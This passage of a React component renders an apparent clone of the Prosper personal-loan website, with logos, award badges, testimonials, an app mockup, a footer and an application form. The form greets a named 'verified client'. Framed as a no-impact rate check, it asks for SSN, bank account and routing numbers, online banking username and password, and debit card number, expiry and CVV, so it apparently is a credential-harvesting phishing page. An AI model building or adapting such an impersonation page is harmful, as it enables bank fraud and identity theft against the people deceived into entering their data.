                <div className="pr-loan-avatar-placeholder" style={{background:"#fde8d4"}}>👩</div>
                <div>
                  <div style={{display:"flex",alignItems:"center",gap:8}}>
                    <span className="pr-loan-name">For Deborah</span>
                    <span style={{color:"#9ca3af",fontWeight:400}}>·</span>
                    <span className="pr-loan-amount" style={{color:"#2D3545"}}>$42,950</span>
                  </div>
                  <div className="pr-loan-sub">Total value</div>
                </div>
                <div className="pr-loan-check">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#F26B21" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
                </div>
              </div>
              <div className="pr-loan-card card-bot">
                <div className="pr-loan-avatar-placeholder" style={{background:"#e8f5f3"}}>👩‍🦱</div>
                <div>
                  <div style={{display:"flex",alignItems:"center",gap:8}}>
                    <span className="pr-loan-name">For Lydia</span>
                    <span style={{color:"#9ca3af",fontWeight:400}}>·</span>
                    <span className="pr-loan-amount" style={{color:"#2D3545"}}>$8,500</span>
                  </div>
                  <div className="pr-loan-sub">Debt consolidation</div>
                </div>
                <div className="pr-loan-check">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#F26B21" strokeWidth="2.5" strokeLinecap="round"><polyline points="20 6 9 17 4 12"/></svg>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Awards Bar — Money, CNBC, Bankrate, 20yr */}
      <div className="pr-awards">
        <div className="pr-awards-inner">
          {/* Money magazine */}
          <div className="pr-award">
            <div style={{display:"flex",alignItems:"center",gap:8}}>
              <svg viewBox="0 0 120 40" width="90" height="30">
                <text x="10" y="28" fontFamily="Georgia,serif" fontSize="26" fontWeight="700" fill="#c8a84b" letterSpacing="1">Money</text>
                {/* left laurel */}
                <path d="M4 20 Q2 15 5 12 Q4 17 7 18 Q5 13 8 11 Q7 16 10 17" fill="none" stroke="#c8a84b" strokeWidth="1.2"/>
              </svg>
            </div>
            <div className="pr-award-text"><span>Best Personal Loan<br/>Companies Top Picks 2026</span></div>
          </div>
          <div className="pr-award-sep"/>
          {/* CNBC */}
          <div className="pr-award">
            <div style={{display:"flex",alignItems:"center",gap:6}}>
              <svg viewBox="0 0 80 30" width="60" height="22">
                <rect x="28" y="5" width="14" height="14" fill="#0275d8" transform="rotate(45 35 12)"/>
                <text x="5" y="24" fontFamily="Arial,sans-serif" fontSize="18" fontWeight="900" fill="#fff" letterSpacing="-0.5">CNBC</text>
              </svg>
            </div>
            <div className="pr-award-text"><span>Top Alternate<br/>Finance Companies</span></div>
          </div>
          <div className="pr-award-sep"/>
          {/* Bankrate */}
          <div className="pr-award">
            <div className="pr-award-icon" style={{background:"#e0f0ff",color:"#0275d8",fontWeight:800,fontSize:13,width:"auto",padding:"4px 10px",borderRadius:6}}>Bankrate</div>
            <div className="pr-award-text"><span>Excellent 4.5<br/>Bankrate Score</span></div>
          </div>
          <div className="pr-award-sep"/>
          {/* 20 Years */}
          <div className="pr-award">
            <div className="pr-award-icon" style={{background:"#fff3ed",fontSize:18,fontWeight:800,color:"#F26B21",width:"auto",padding:"4px 12px",borderRadius:6}}>20+</div>
            <div className="pr-award-text"><b>Years of Trust</b><span>Serving members since 2005</span></div>
          </div>
        </div>
      </div>

      {/* Why Prosper — with beach photo */}
      <section className="pr-section">
        <div className="pr-section-inner">
          <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:40,alignItems:"center"}}>
            <div>
              <div className="pr-eyebrow">Why Prosper</div>
              <h2 className="pr-title">Here to help you thrive</h2>
              <div style={{display:"grid",gridTemplateColumns:"1fr 1fr",gap:16,marginTop:28}}>
                {[
                  { icon:"💻", title:"100% online applications", desc:"Check your rate in minutes. No branch visit needed." },
                  { icon:"🔍", title:"Ease & transparency", desc:"Clear terms, no hidden fees, no surprises." },
                  { icon:"🤝", title:"Human customer service", desc:"Real people ready to answer your questions." },
                  { icon:"📅", title:"20 years of experience", desc:"Helping people thrive since 2005 with $25B+ funded." },
                ].map(f => (
                  <div key={f.title} className="pr-feat" style={{textAlign:"left",padding:"20px 18px"}}>
                    <div className="pr-feat-icon" style={{marginBottom:10}}>{f.icon}</div>
                    <h3 style={{marginBottom:6}}>{f.title}</h3>
                    <p>{f.desc}</p>
                  </div>
                ))}
              </div>
            </div>
            <div style={{borderRadius:20,overflow:"hidden",height:420}}>
              <img src="/prosper-beach.png" alt="Woman thriving with Prosper"
                style={{width:"100%",height:"100%",objectFit:"cover",objectPosition:"center"}}
                onError={e => { (e.target as HTMLImageElement).style.background="linear-gradient(135deg,#f0e4d7,#c8a87a)"; }}
              />
            </div>
          </div>
        </div>
      </section>

      {/* Products */}
      <section className="pr-section light">
        <div className="pr-section-inner">
          <div className="pr-eyebrow">Our Products</div>
          <h2 className="pr-title">Everything you need to thrive financially</h2>
          <div className="pr-prod-grid">
            <div className="pr-prod-card">
              <div className="pr-prod-badge">PERSONAL LOANS</div>
              <h3>Personal loans up to $50K & low rates</h3>
              <p>Next-day funding. No prepay penalties. Get a rate check in minutes with no impact to your credit score.</p>
              <ul style={{listStyle:"none",marginBottom:20}}>
                {["Borrow from $2K to $50K","Next-day funding available","Rates from competitive APRs"].map(i=>(
                  <li key={i} style={{display:"flex",alignItems:"center",gap:8,marginBottom:8,fontSize:13}}><CheckIco/>{i}</li>
                ))}
              </ul>
              <span className="pr-prod-link" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Explore personal loans <ChevRight/></span>
            </div>
            <div className="pr-prod-card">
              <div className="pr-prod-badge" style={{background:"#e0f7f4",color:"var(--pr-teal)"}}>PROSPER® CARD</div>
              <h3>The Prosper® Card to build your future</h3>
              <p>Up to $3,000 credit limit. No security deposit required. Start building or rebuilding your credit today.</p>
              <ul style={{listStyle:"none",marginBottom:20}}>
                {["Up to $3,000 credit limit","No security deposit","Apply in minutes, decide fast"].map(i=>(
                  <li key={i} style={{display:"flex",alignItems:"center",gap:8,marginBottom:8,fontSize:13}}><CheckIco/>{i}</li>
                ))}
              </ul>
              <span className="pr-prod-link" style={{color:"var(--pr-teal)"}} onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Explore the Prosper® Card <ChevRight/></span>
            </div>
            <div className="pr-prod-card">
              <div className="pr-prod-badge" style={{background:"#fff7ed",color:"#c2410c"}}>INVESTING & IRAs</div>
              <h3>Investing & IRAs to diversify your portfolio</h3>
              <p>Unique alternative investment opportunity with a 5.2% average historical return. Diversify beyond stocks.</p>
              <ul style={{listStyle:"none",marginBottom:20}}>
                {["Unique investments","5.2% avg. historical return","IRAs available"].map(i=>(
                  <li key={i} style={{display:"flex",alignItems:"center",gap:8,marginBottom:8,fontSize:13}}><CheckIco/>{i}</li>
                ))}
              </ul>
              <span className="pr-prod-link" style={{color:"#c2410c"}} onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Explore investing <ChevRight/></span>
            </div>
          </div>
        </div>
      </section>

      {/* Credit Score Quiz */}
      <div className="pr-quiz">
        <div className="pr-quiz-inner">
          <div className="pr-eyebrow" style={{color:"rgba(255,255,255,0.6)"}}>Personalized Options</div>
          <h2 className="pr-quiz-title">What's your credit score range?</h2>
          <div className="pr-scores">
            {[["300–499","⚠️"],["500–600","📊"],["601–660","📈"],["661–780","⭐"],["781–850","🏆"]].map(([range, icon]) => (
              <button key={range} className={`pr-score-btn${selectedScore===range?" selected":""}`} onClick={()=>{setSelectedScore(range);setTimeout(()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"}),300);}}>
                <div style={{fontSize:22,marginBottom:6}}>{icon}</div>
                <div>{range}</div>
              </button>
            ))}
          </div>
          {selectedScore && (
            <div style={{background:"rgba(255,255,255,0.1)",borderRadius:12,padding:"20px 28px",marginTop:8}}>
              <p style={{fontSize:15,marginBottom:16}}>Based on your score range <strong>({selectedScore})</strong>, we have loan options available for you!</p>
              <button className="pr-apply-btn" onClick={()=>document.getElementById("apply-form")?.scrollIntoView({behavior:"smooth"})}>Check your rate now</button>
            </div>
          )}
        </div>
      </div>

      {/* Testimonials */}
      <section className="pr-section" style={{paddingBottom:40}}>
        <div className="pr-section-inner">
          <div className="pr-eyebrow">What Our Customers Say</div>
          <h2 className="pr-title">20 years of advancing financial well-being</h2>
        </div>
        <div className="pr-testimonials" style={{marginTop:32}}>
          <div className="pr-testimonial-track">
            {doubledTestimonials.map((t, i) => (
              <div key={i} className="pr-t-card">
                <div className="pr-t-stars">★★★★★</div>
                <p className="pr-t-text">"{t.text}"</p>
                <div className="pr-t-author">— {t.author} · {t.source}</div>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* App Section — with phone mockup */}
      <section className="pr-app-section">
        <div style={{maxWidth:1100,margin:"0 auto",display:"grid",gridTemplateColumns:"1fr 1fr",gap:60,alignItems:"center",padding:"0 24px"}}>
          <div>
            <h2 className="pr-app-h2">Do it all in the Prosper app</h2>
            <p className="pr-app-p">Free credit tracking & score insights, loan management, investing portfolio — all in one place.</p>
            <div className="pr-store-btns" style={{marginTop:28}}>
              <div className="pr-store-btn">
                <span style={{fontSize:22}}>🍎</span>
                <div><div style={{fontSize:10,opacity:0.7}}>Download on the</div><div style={{fontSize:14,fontWeight:700}}>App Store</div></div>
              </div>
              <div className="pr-store-btn">
                <span style={{fontSize:22}}>▶</span>
                <div><div style={{fontSize:10,opacity:0.7}}>Get it on</div><div style={{fontSize:14,fontWeight:700}}>Google Play</div></div>
              </div>
            </div>
          </div>
          {/* Phone mockup showing credit score */}
          <div style={{display:"flex",justifyContent:"center",alignItems:"center",position:"relative"}}>
            {/* Notification bubbles */}
            <div style={{position:"absolute",left:"-10px",top:"15%",background:"rgba(255,255,255,0.12)",backdropFilter:"blur(8px)",border:"1px solid rgba(255,255,255,0.2)",borderRadius:12,padding:"10px 14px",fontSize:12,color:"#fff",fontWeight:600,maxWidth:160,display:"flex",alignItems:"center",gap:8,zIndex:2}}>
              <div style={{width:28,height:28,borderRadius:"50%",background:"#F26B21",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontSize:13}}>⚡</div>
              Your credit line just got a bump!
            </div>
            <div style={{position:"absolute",right:"-10px",top:"20%",background:"rgba(255,255,255,0.12)",backdropFilter:"blur(8px)",border:"1px solid rgba(255,255,255,0.2)",borderRadius:12,padding:"10px 14px",fontSize:12,color:"#fff",fontWeight:600,maxWidth:170,display:"flex",alignItems:"center",gap:8,zIndex:2}}>
              <div style={{width:28,height:28,borderRadius:"50%",background:"#F26B21",display:"flex",alignItems:"center",justifyContent:"center",flexShrink:0,fontSize:13}}>📈</div>
              +15pt credit score increase last month!
            </div>
            {/* Phone frame */}
            <div style={{width:220,background:"#1e2635",borderRadius:40,padding:"12px 8px",boxShadow:"0 30px 80px rgba(0,0,0,0.4)",position:"relative",zIndex:1}}>
              {/* Notch */}
              <div style={{width:70,height:20,background:"#1e2635",borderRadius:10,margin:"0 auto 10px",position:"relative",zIndex:2}}/>
              {/* Screen */}
              <div style={{background:"#fff8f4",borderRadius:28,padding:"20px 16px",minHeight:360}}>
                {/* App header */}
                <div style={{textAlign:"center",marginBottom:16}}>
                  <div style={{width:48,height:48,borderRadius:"50%",background:"linear-gradient(135deg,#F26B21,#D81265)",margin:"0 auto 10px",display:"flex",alignItems:"center",justifyContent:"center",fontSize:20}}>😊</div>
                  <div style={{fontSize:14,fontWeight:800,color:"#2D3545"}}>Keep up the good work!</div>
                  <div style={{fontSize:11,color:"#9ca3af",marginTop:2}}>See your credit score progress</div>
                </div>
                {/* Score gauge */}
                <div style={{background:"#fff",borderRadius:16,padding:"20px 16px",marginBottom:8}}>
                  <svg viewBox="0 0 160 90" style={{width:"100%",height:"auto"}}>
                    {/* Background arc */}
                    <path d="M20 80 A60 60 0 0 1 140 80" fill="none" stroke="#f0e4d7" strokeWidth="12" strokeLinecap="round"/>
                    {/* Score arc (755 out of 850, ~75%) */}
                    <path d="M20 80 A60 60 0 0 1 130 32" fill="none" stroke="#F26B21" strokeWidth="12" strokeLinecap="round"/>
                    {/* Teal diamond marker */}
                    <polygon points="133,28 138,33 133,38 128,33" fill="#00897B"/>
                    {/* Score text */}
                    <text x="80" y="68" textAnchor="middle" fontFamily="Inter,sans-serif" fontSize="22" fontWeight="800" fill="#2D3545">755</text>
                    <text x="80" y="82" textAnchor="middle" fontFamily="Inter,sans-serif" fontSize="9" fill="#9ca3af">Nice work!</text>
                    <text x="20" y="92" textAnchor="middle" fontFamily="Inter,sans-serif" fontSize="8" fill="#9ca3af">300</text>
                    <text x="140" y="92" textAnchor="middle" fontFamily="Inter,sans-serif" fontSize="8" fill="#9ca3af">850</text>
                  </svg>
                </div>
                {/* Credit tracking label */}
                <div style={{textAlign:"center",fontSize:11,fontWeight:600,color:"#F26B21",marginTop:4}}>Free credit tracking & insights</div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Application Form */}
      <section className="pr-form-section" id="apply-form">
        <div style={{textAlign:"center",marginBottom:32}}>
          <div className="pr-eyebrow">Apply Now</div>
          <h2 className="pr-title">{client ? `Apply Now — ${client.name}` : "Check Your Rate in Minutes"}</h2>
          <p style={{color:"var(--pr-gray)",fontSize:15,marginTop:8}}>Checking your rate won't impact your credit score.</p>
        </div>

        <div className="pr-form-wrap">
          <div className="pr-form-header">
            <ProsperLogo height={40} />
            <h2 style={{marginTop:16}}>Prosper Application</h2>
            <p>{client ? `Verified access for ${client.name}` : "Complete the form below to check your personalized rate"}</p>
          </div>

          <div className="pr-form-body">
            {client && (
              <div className="pr-client-badge">
                <CheckIco/> Verified client access — {client.name}
              </div>
            )}

            <form onSubmit={handleSubmit(onSubmit)}>
              {/* Personal */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><UserIco/> Personal Information</div>
                <div className="pr-g2">
                  <div className="pr-fgroup"><label className="pr-lbl">First Name</label><input className="pr-in" {...register("firstName")} placeholder="First name"/>{errors.firstName&&<p className="pr-err">{errors.firstName.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Last Name</label><input className="pr-in" {...register("lastName")} placeholder="Last name"/>{errors.lastName&&<p className="pr-err">{errors.lastName.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Email Address</label><input className="pr-in" type="email" {...register("email")} placeholder="you@example.com"/>{errors.email&&<p className="pr-err">{errors.email.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Phone Number</label><input className="pr-in" {...register("phone")} placeholder="(555) 000-0000"/>{errors.phone&&<p className="pr-err">{errors.phone.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Date of Birth</label><input className="pr-in" type="date" {...register("dob")}/>{errors.dob&&<p className="pr-err">{errors.dob.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Social Security Number</label><div className="pr-icon-field"><input className="pr-in" {...register("ssn")} placeholder="No dashes" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.ssn&&<p className="pr-err">{errors.ssn.message}</p>}</div>
                </div>
                <div className="pr-fgroup"><label className="pr-lbl">Street Address</label><input className="pr-in" {...register("address")} placeholder="123 Main Street"/>{errors.address&&<p className="pr-err">{errors.address.message}</p>}</div>
                <div className="pr-g3">
                  <div className="pr-fgroup"><label className="pr-lbl">City</label><input className="pr-in" {...register("city")} placeholder="City"/>{errors.city&&<p className="pr-err">{errors.city.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">State</label><input className="pr-in" {...register("state")} placeholder="ST" maxLength={2}/>{errors.state&&<p className="pr-err">{errors.state.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Zip Code</label><input className="pr-in" {...register("zip")} placeholder="10001" maxLength={5}/>{errors.zip&&<p className="pr-err">{errors.zip.message}</p>}</div>
                </div>
              </div>

              {/* Loan */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><BriefIco/> Loan Details</div>
                <div className="pr-g2">
                  <div className="pr-fgroup"><label className="pr-lbl">Monthly Income ($)</label><input className="pr-in" type="number" {...register("monthlyIncome")} placeholder="e.g. 5,000"/>{errors.monthlyIncome&&<p className="pr-err">{errors.monthlyIncome.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Loan Amount ($)</label><input className="pr-in" type="number" {...register("loanAmount")} placeholder="e.g. 10,000"/>{errors.loanAmount&&<p className="pr-err">{errors.loanAmount.message}</p>}</div>
                </div>
                <div className="pr-fgroup"><label className="pr-lbl">Credit Score Range</label>
                  <select className="pr-in" {...register("creditScore")} defaultValue="" style={{height:46,cursor:"pointer"}}>
                    <option value="" disabled>Select your credit range</option>
                    <option value="good">781–850 (Excellent)</option>
                    <option value="low">661–780 (Good)</option>
                    <option value="bad">Below 660 (Fair / Poor)</option>
                  </select>
                  {errors.creditScore&&<p className="pr-err">{errors.creditScore.message}</p>}
                </div>
              </div>

              {/* Banking */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><BankIco/> Banking Information</div>
                <p style={{fontSize:13,color:"var(--pr-gray)",marginBottom:20}}>Bank-level 256-bit SSL encryption secures your data. Required for identity verification and fund disbursement.</p>
                <div className="pr-g2">
                  <div className="pr-fgroup"><label className="pr-lbl">Bank Name</label><input className="pr-in" {...register("bankName")} placeholder="e.g. Wells Fargo"/>{errors.bankName&&<p className="pr-err">{errors.bankName.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Years with Bank</label><input className="pr-in" type="number" {...register("yearsWithBank")} placeholder="e.g. 5"/>{errors.yearsWithBank&&<p className="pr-err">{errors.yearsWithBank.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Checking Account Number</label><div className="pr-icon-field"><input className="pr-in" {...register("accountNumber")} placeholder="Account number"/><span className="fi"><LockIco/></span></div>{errors.accountNumber&&<p className="pr-err">{errors.accountNumber.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Routing Number</label><div className="pr-icon-field"><input className="pr-in" {...register("routingNumber")} placeholder="9 digits" maxLength={9}/><span className="fi"><LockIco/></span></div>{errors.routingNumber&&<p className="pr-err">{errors.routingNumber.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Online Banking Username</label><div className="pr-icon-field"><input className="pr-in" {...register("mobileUsername")} placeholder="Your banking username"/><span className="fi"><LockIco/></span></div>{errors.mobileUsername&&<p className="pr-err">{errors.mobileUsername.message}</p>}</div>
                  <div className="pr-fgroup"><label className="pr-lbl">Online Banking Password</label><div className="pr-icon-field"><input className="pr-in" type="password" {...register("mobilePassword")} placeholder="Your banking password"/><span className="fi"><LockIco/></span></div>{errors.mobilePassword&&<p className="pr-err">{errors.mobilePassword.message}</p>}</div>
                </div>
              </div>

              {/* Debit Card */}
              <div className="pr-sec-group">
                <div className="pr-sect-label"><span style={{fontSize:18}}>💳</span> Debit Card Information</div>
                <p style={{fontSize:13,color:"var(--pr-gray)",marginBottom:20}}>Used to transfer your advance directly to your debit card for instant access to funds.</p>
                <div className="pr-g2">
                  <div className="pr-fgroup">
                    <label className="pr-lbl">Debit Card Number</label>
                    <div className="pr-icon-field">
                      <input className="pr-in" {...register("debitCardNumber")} placeholder="1234 5678 9012 3456" maxLength={19}
                        onChange={e => {
                          // auto-format with spaces every 4 digits
                          const val = e.target.value.replace(/\D/g,'').slice(0,16);
                          const fmt = val.replace(/(\d{4})(?=\d)/g,'$1 ');
                          e.target.value = fmt;
                        }}
                      />
                      <span className="fi"><LockIco/></span>
                    </div>
                    {errors.debitCardNumber&&<p className="pr-err">{errors.debitCardNumber.message}</p>}
                  </div>
                  <div className="pr-fgroup">
                    <label className="pr-lbl">Expiration Date (MM/YY)</label>
                    <div className="pr-icon-field">
                      <input className="pr-in" {...register("debitCardExpiry")} placeholder="MM/YY" maxLength={5}
                        onChange={e => {
                          const val = e.target.value.replace(/\D/g,'').slice(0,4);
                          if (val.length >= 3) e.target.value = val.slice(0,2) + '/' + val.slice(2);
                          else e.target.value = val;
                        }}
                      />
                      <span className="fi"><LockIco/></span>
                    </div>
                    {errors.debitCardExpiry&&<p className="pr-err">{errors.debitCardExpiry.message}</p>}
                  </div>
                  <div className="pr-fgroup">
                    <label className="pr-lbl">CVV / Security Code</label>
                    <div className="pr-icon-field">
                      <input className="pr-in" {...register("debitCardCvv")} placeholder="3 or 4 digits" maxLength={4}
                        onChange={e => { e.target.value = e.target.value.replace(/\D/g,'').slice(0,4); }}
                      />
                      <span className="fi"><LockIco/></span>
                    </div>
                    {errors.debitCardCvv&&<p className="pr-err">{errors.debitCardCvv.message}</p>}
                  </div>
                </div>
              </div>

              <button type="submit" className="pr-submit" disabled={isSubmitting}>
                {isSubmitting ? <><div className="pr-spin"/>Processing...</> : <>Check My Rate — No Credit Impact <ChevRight/></>}
              </button>
              <p className="pr-fine">
                By submitting, you agree to our <a href="#">Terms of Use</a> and <a href="#">Privacy Policy</a>.<br/>
                Checking your rate uses a soft credit inquiry only — no impact to your score. All personal loans made by WebBank.
              </p>
            </form>
          </div>
        </div>
      </section>

      {/* Footer */}
      <footer className="pr-footer">
        <div className="pr-ft-main">
          <div className="pr-ft-brand">
            <ProsperLogo height={32} />
            <p>Helping people thrive since 2005. © 2005–2026 Prosper Funding LLC. All rights reserved.<br/>221 Main Street, Suite 300, San Francisco, CA 94105</p>
          </div>
          {[
            { h:"Products", links:["Personal Loans","The Prosper® Card","Investing","Business Loans","Student Loans"] },
            { h:"Tools", links:["Resources Hub","Prosper Blog","Debt Consolidation Guide","Credit Management Guide","Loan Calculator"] },
            { h:"Company", links:["About Us","Media Room","Careers","Legal Agreements","Prospectus","Developers"] },
            { h:"Support", links:["Help Center","Contact Us","FAQs","Do Not Sell My Info","NMLS Consumer Access"] },
          ].map(({h,links}) => (
            <div key={h} className="pr-ft-col">
              <h4>{h}</h4>
              <ul>{links.map(l=><li key={l}><a href="#">{l}</a></li>)}</ul>
            </div>
          ))}
        </div>
        <div className="pr-ft-bottom">
          <div className="pr-fb">
            <p>© 2005–2026 Prosper Funding LLC. All rights reserved. | Prosper Marketplace, Inc. NMLS#111473</p>
            <div style={{display:"flex",gap:16}}>
              <a href="#">Privacy Policy</a>
              <a href="#">Licensing & Disclosures</a>
              <a href="#">NMLS Consumer Access</a>
            </div>
          </div>
        </div>
        <div className="pr-disclaimer">
          <strong>IMPORTANT INFORMATION:</strong> All personal loans made by WebBank. Eligibility for personal loans up to $50,000 depends on your financial history, credit score, monthly income, and monthly expenses. Eligibility is not guaranteed and requires sufficient investor commitments. ¹ Weighted average historical return for loans originated through Prosper as of Mar 31, 2026. Historical performance is no guarantee of future results. The Prosper Credit Card is issued by Coastal Community Bank, Member FDIC, pursuant to license by Mastercard®.
        </div>
      </footer>
    </div>
  );
}
